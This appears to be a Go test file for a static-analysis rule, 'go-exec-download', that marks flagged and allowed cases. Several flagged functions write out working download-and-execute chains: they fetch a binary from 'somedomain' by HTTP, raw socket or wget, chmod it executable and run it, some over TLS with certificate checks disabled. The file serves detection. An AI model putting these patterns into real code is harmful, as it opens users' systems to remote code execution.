package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
)

func test1() {

	resp, _ := http.Get("http://somedomain/bin")
	// ruleid: go-exec-download
	f, _ := os.Create("/tmp/bin1")
	io.Copy(f, resp.Body)
	// ruleid: go-exec-download
	os.Chmod("/tmp/bin1", 0755)
	exec.Command("/tmp/bin1").Run()
}

func test2() {
	// ok: go-exec-download
	resp, _ := http.Get("http://somedomain/bin")
	f, _ := os.Create("/tmp/bin2")
	io.Copy(f, resp.Body)
	fmt.Println("Downloaded but not executed.")
}

func test3() {
	// ok: go-exec-download
	f, _ := os.OpenFile("/tmp/bin3", os.O_CREATE|os.O_WRONLY, 0644)
	f.Write([]byte("hello"))
}

func test4() {
	// ok: go-exec-download
	conn, _ := tls.Dial("tcp", "somedomain:443", &tls.Config{InsecureSkipVerify: true})
	f, _ := os.Create("/tmp/bin4")
	io.Copy(f, conn)
}

func test5() {
	// ok: go-exec-download
	resp, _ := http.Get("http://somedomain/bin")
	f, _ := os.Create("/tmp/bin5")
	io.Copy(f, resp.Body)
	os.Chmod("/tmp/bin5", 0644)
}

func test6() {

	conn, _ := net.Dial("tcp", "somedomain:80")
	// ruleid: go-exec-download
	f, _ := os.Create("/tmp/bin6")
	io.Copy(f, conn)
	info, _ := os.Stat("/tmp/bin6")
	// ruleid: go-exec-download
	os.Chmod("/tmp/bin6", info.Mode()|0111)
	exec.Command("/tmp/bin6").Run()
}

func test7() {
	conn, _ := tls.Dial("tcp", "somedomain:443", &tls.Config{InsecureSkipVerify: true})
	f, _ := os.Create("/tmp/bin7")
	io.Copy(f, conn)
	// ruleid: go-exec-download
	perm := os.FileMode(0755)
	os.Chmod("/tmp/bin7", perm)
	exec.Command("/tmp/bin7").Run()
}

func test8() {

	exec.Command("wget", "-O", "/tmp/bin8", "http://somedomain/bin").Run()
	// ruleid: go-exec-download
	os.Chmod("/tmp/bin8", 0755)
	exec.Command("/tmp/bin8").Run()
}

func test9() {

	resp, _ := http.Get("http://somedomain/bin")
	// ruleid: go-exec-download
	f, _ := os.OpenFile("/tmp/bin9", os.O_CREATE|os.O_WRONLY, 0755)
	io.Copy(f, resp.Body)
	exec.Command("/tmp/bin9").Run()
}

func test10() {
	// ok: go-exec-download
	resp, _ := http.Get("http://somedomain/bin")
	f, _ := os.Create("/tmp/bin10")
	io.Copy(f, resp.Body)
	fmt.Println("File saved.")
}
